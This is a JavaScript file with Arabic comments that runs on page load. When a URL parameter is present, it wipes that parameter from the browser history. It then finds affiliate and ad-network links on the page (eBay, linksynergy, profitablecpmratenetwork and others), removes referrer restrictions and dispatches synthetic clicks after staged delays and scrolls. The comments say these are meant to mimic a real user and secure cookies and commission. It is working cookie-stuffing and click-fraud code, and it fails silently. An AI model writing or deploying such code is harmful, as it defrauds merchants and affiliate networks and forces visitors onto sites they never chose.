document.addEventListener('DOMContentLoaded', async () => {
    // 1. استخراج المعامل 'a' من الرابط
    const url = new URL(window.location.href);
    const actionType = url.searchParams.get('a');

    // التوقف إذا لم يكن المعامل موجوداً أو غير مطابق (1-4)
    if (!['1', '2', '3', '4'].includes(actionType)) return;

    // 2. تنظيف الرابط فوراً من سجل المتصفح (لضمان زر رجوع نظيف وريفير احترافي)
    if (window.history.replaceState) {
        const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
        window.history.replaceState({path: cleanUrl}, "", cleanUrl);
    }

    // 3. دالة البحث الشاملة عن جميع الروابط المستهدفة
    const getTargetLink = () => {
        const domains = [
            'ebay.us', 
            'ebay.ca', 
            'rzekl.com', 
            'click.linksynergy.com', 
            'viiukuhe.com',
            'profitablecpmratenetwork.com' // النطاق الجديد
        ];
        // بناء الاستعلام للبحث عن أي رابط يحتوي على أحد هذه النطاقات
        const selector = domains.map(d => `a[href*="${d}"]`).join(', ');
        return document.querySelector(selector);
    };

    // 4. تنفيذ النقرة "الذكية" لضمان الكوكيز والعمولة
    const forceAffiliateClick = (link) => {
        if (!link) return;

        // إزالة القيود التي قد تمنع إرسال الريفير (Referrer)
        link.removeAttribute('rel'); 
        link.setAttribute('referrerpolicy', 'no-referrer-when-downgrade');
        
        // توليد حدث نقر (MouseEvent) حقيقي لمحاكاة ضغطة المستخدم
        const clickEvent = new MouseEvent('click', {
            view: window,
            bubbles: true,
            cancelable: true
        });
        
        console.log("جاري التوجيه الآمن إلى: " + link.href);
        link.dispatchEvent(clickEvent);

        // إجراء احتياطي سريع جداً في حال فشل الحدث البرمجي
        setTimeout(() => { if(link) link.click(); }, 50);
    };

    // 5. سيناريوهات التنفيذ (مزيج من السرعة والأنسنة)
    const simulationActions = {
        '1': async () => {
            await new Promise(r => setTimeout(r, 400)); 
            forceAffiliateClick(getTargetLink());
        },
        '2': async () => {
            window.scrollTo({ top: 150, behavior: 'auto' }); 
            await new Promise(r => setTimeout(r, 300));
            forceAffiliateClick(getTargetLink());
        },
        '3': async () => {
            await new Promise(r => setTimeout(r, 200)); // الأسرع
            forceAffiliateClick(getTargetLink());
        },
        '4': async () => {
            window.scrollTo({ top: 200, behavior: 'smooth' });
            await new Promise(r => setTimeout(r, 600)); 
            forceAffiliateClick(getTargetLink());
        }
    };

    try {
        if (simulationActions[actionType]) {
            await simulationActions[actionType]();
        }
    } catch (e) {
        // فشل صامت لضمان استمرارية عمل الصفحة
    }
});
